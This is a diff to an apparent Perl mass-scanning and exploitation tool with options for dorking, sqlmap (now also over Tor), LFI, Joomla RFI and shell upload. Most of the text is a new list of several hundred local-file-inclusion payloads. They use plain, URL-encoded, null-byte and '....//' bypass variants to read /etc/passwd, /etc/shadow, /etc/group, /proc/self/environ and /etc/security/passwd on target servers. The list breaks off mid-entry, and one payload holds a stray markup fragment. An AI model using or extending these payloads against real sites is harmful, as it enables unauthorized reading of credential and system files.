@@ -75,6 +75,7 @@ my $listname;
 my $validation_text;
 my $exploit;
 my $sqlmap;
+my $sqlmaptor;
 my $mlfi;
 my $mjoomrfi;
 my $shell;
@@ -111,6 +112,7 @@ Getopt::Long::GetOptions(\my %OPT,
                         'valid=s' => \$validation_text,
                         'exp=s' => \$exploit,
                         'sqlmap' => \$sqlmap,
+                        'sqlmaptor' => \$sqlmaptor,
                         'lfi' => \$mlfi,
                         'joomrfi' => \$mjoomrfi,
                         'shell=s' => \$shell,
@@ -154,6 +156,7 @@ if (@ARGV > 0){
 			'valid',
 			'exp',
 			'sqlmap',
+			'sqlmaptor',
 			'lfi',
 			'joomrfi',
 			'shell',
@@ -183,7 +186,7 @@ if (@ARGV > 0){
 			'about',
   );
   
-  if (!exists $com{help || tor || s || mp || xss || t || l || xss || valid || exp || sqlmap || lfi || joomrfi || shell || wpadf || admin || shost || ports || start || end || tcp || udp || basic || all || sites || wp || joom || zip || upload || md5 || decode64 || encode64 || st || httpd || command || TARGET || isup || about}) {
+  if (!exists $com{help || tor || s || mp || xss || t || l || xss || valid || exp || sqlmap || sqlmaptor || lfi || joomrfi || shell || wpadf || admin || shost || ports || start || end || tcp || udp || basic || all || sites || wp || joom || zip || upload || md5 || decode64 || encode64 || st || httpd || command || TARGET || isup || about}) {
 	advise();
   }
 }
@@ -248,9 +251,9 @@ if (defined $dork) {
   
   if (defined $mlfi) {
       submsearch();
-      if (!defined $validation_text) { mlistLf(); exit();}
-      if (defined $validation_text) { mlistLf(); mlvalidation(); exit();}
-      if (defined $misup) { mlistLf();mlisup; exit();}
+      if (!defined $validation_text) { mlistLfi(); exit();}
+      if (defined $validation_text) { mlistLfi(); mlvalidation(); exit();}
+      if (defined $misup) { mlistLfi();mlisup; exit();}
 
   }
   if ((defined $misup) && (defined $exploit)) {submsearch(); mlisup(); exit(); }
@@ -639,8 +642,7 @@ if (defined $mabout) {
 #######################################################
 #######################################################
 
-sub LFI {@LFI =("/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00");}
-@LFI =("/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00");
+sub LFI {@LFI =("/passwd.txt", "/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","....//etc/passwd","....//....//etc/passwd","....//....//....//etc/passwd","....//....//....//....//etc/passwd","....//....//....//....//....//etc/passwd","....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//....//....//etc/passwd","....//etc/passwd%00","....//....//etc/passwd%00","....//....//....//etc/passwd%00","....//....//....//....//etc/passwd%00","....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/passwd%00","%2Fetc%2Fpasswd","..%2Fetc%2Fpasswd","..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","%2Fetc%2Fpasswd%00","..%2Fetc%2Fpasswd%00","..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","....%2f%2Fetc/passwd","....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","/proc/self/environ","../proc/self/environ","../../proc/self/environ","../../../proc/self/environ","../../../../proc/self/environ","../../../../../proc/self/environ","../../../../../../proc/self/environ","../../../../../../../proc/self/environ","../../../../../../../../proc/self/environ","../../../../../../../../../proc/self/environ","../../../../../../../../../../proc/self/environ","/proc/self/environ%00","../proc/self/environ%00","../../proc/self/environ%00","../../../proc/self/environ%00","../../../../proc/self/environ%00","../../../../../proc/self/environ%00","../../../../../../proc/self/environ%00","../../../../../../../proc/self/environ%00","../../../../../../../../proc/self/environ%00","../../../../../../../../../proc/self/environ%00","../../../../../../../../../../proc/self/environ%00","%2Fproc%2Fself%2Fenviron","..%2Fproc%2Fself%2Fenviron","..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","%2Fproc%2Fself%2Fenviron%00","..%2Fproc%2Fself%2Fenviron%00","..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","//proc/self/environ","....//proc/self/environ","....//....//proc/self/environ","....//....//....//proc/self/environ","....//....//....//....//proc/self/environ","....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//....//....//proc/self/environ","//proc/self/environ%00","....//proc/self/environ%00","....//....//proc/self/environ%00","....//....//....//proc/self/environ%00","....//....//....//....//proc/self/environ%00","....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//....//....//proc/self/environ%00","%2f%2Fproc/self/environ","....%2f%2Fproc/self/environ","....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","%2f%2Fproc/self/environ%00","....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F..<!---->..%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","/etc/shadow","../etc/shadow","../../etc/shadow","../../../etc/shadow","../../../../etc/shadow","../../../../../etc/shadow","../../../../../../etc/shadow","../../../../../../../etc/shadow","../../../../../../../../etc/shadow","../../../../../../../../../etc/shadow","../../../../../../../../../../etc/shadow","/etc/shadow%00","../etc/shadow%00","../../etc/shadow%00","../../../etc/shadow%00","../../../../etc/shadow%00","../../../../../etc/shadow%00","../../../../../../etc/shadow%00","../../../../../../../etc/shadow%00","../../../../../../../../etc/shadow%00","../../../../../../../../../etc/shadow%00","../../../../../../../../../../etc/shadow%00","%2Fetc..%2Fshadow","..%2Fetc%2Fshadow","..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","%2Fetc..%2Fshadow%00","..%2Fetc%2Fshadow%00","..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","%2F%2Fetc/shadow","....%2f%2Fetc/shadow","....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","%2F%2Fetc/shadow%00","....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....//etc/shadow","....//....//etc/shadow","....//....//....//etc/shadow","....//....//....//....//etc/shadow","....//....//....//....//....//etc/shadow","....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//....//....//etc/shadow","....//etc/shadow%00","....//....//etc/shadow%00","....//....//....//etc/shadow%00","....//....//....//....//etc/shadow%00","....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//....//....//etc/shadow%00","/etc/group","../etc/group","../../etc/group","../../../etc/group","../../../../etc/group","../../../../../etc/group","../../../../../../etc/group","../../../../../../../etc/group","../../../../../../../../etc/group","../../../../../../../../../etc/group","../../../../../../../../../../etc/group","/etc/group%00","../etc/group%00","../../etc/group%00","../../../etc/group%00","../../../../etc/group%00","../../../../../etc/group%00","../../../../../../etc/group%00","../../../../../../../etc/group%00","../../../../../../../../etc/group%00","../../../../../../../../../etc/group%00","../../../../../../../../../../etc/group%00","%2Fetc..%2Fgroup","..%2Fetc%2Fgroup","..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","%2Fetc%2Fgroup%00","..%2Fetc%2Fgroup%00","..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","%2F%2Fetc/group","....%2F%2Fetc/group","....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","/etc/group%00","....%2F%2Fetc/group%00","....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","//etc/group","....//etc/group","....//....//etc/group","....//....//....//etc/group","....//....//....//....//etc/group","....//....//....//....//....//etc/group","....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//....//....//etc/group","//etc/group%00","....//etc/group%00","....//....//etc/group%00","....//....//....//etc/group%00","....//....//....//....//etc/group%00","....//....//....//....//....//etc/group%00","....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//....//....//etc/group%00","/etc/security/passwd","../etc/security/passwd","../../etc/security/passwd","../../../etc/security/passwd","../../../../etc/security/passwd","../../../../../etc/security/passwd","../../../../../../etc/security/passwd","../../../../../../../etc/security/passwd","../../../../../../../../etc/security/passwd","../../../../../../../../../etc/security/passwd","../../../../../../../../../../etc/security/passwd","/etc/security/passwd%00","../etc/security/passwd%00","../../etc/security/passwd%00","../../../etc/security/passwd%00","../../../../etc/security/passwd%00","../../../../../etc/security/passwd%00","../../../../../../etc/security/passwd%00","../../../../../../../etc/security/passwd%00","../../../../../../../../etc/security/passwd%00","../../../../../../../../../etc/security/passwd%00","../../../../../../../../../../etc/security/passwd%00","%2Fetc%2Fsecurity%2Fpasswd","..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","%2Fetc%2Fsecurity%2Fpasswd%00","..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....//etc/security/passwd","....//....//etc/security/passwd","....//....//....//etc/security/passwd","....//....//....//....//etc/security/passwd","....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//....//etc/security/passwd","....//etc/security/passwd%00","....//....//etc/security/passwd%00","....//....//....//etc/security/passwd%00","....//....//....//....//etc/security/passwd%00","....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/security/passwd%00","/etc/security/passwd","../etc/security/passwd","../../etc/security/passwd","../../../etc/security/passwd","../../../../etc/security/passwd","../../../../../etc/security/passwd","../../../../../../etc/security/passwd","../../../../../../../etc/security/passwd","../../../../../../../../etc/security/passwd","../../../../../../../../../etc/security/passwd","../../../../../../../../../../etc/security/passwd","/etc/security/passwd%00","../etc/security/passwd%00","../../etc/security/passwd%00","../../../etc/security/passwd%00","../../../../etc/security/passwd%00","../../../../../etc/security/passwd%00","../../../../../../etc/security/passwd%00","../../../../../../../etc/security/passwd%00","../../../../../../../../etc/security/passwd%00","../../../../../../../../../etc/security/passwd%00","../../../../../../../../../../etc/security/passwd%00","%2Fetc%2Fsecurity%2Fpasswd","..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","%2Fetc%2Fsecurity%2Fpasswd%00","..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2Fetc/security/passwd%00","....%2F%2F....%2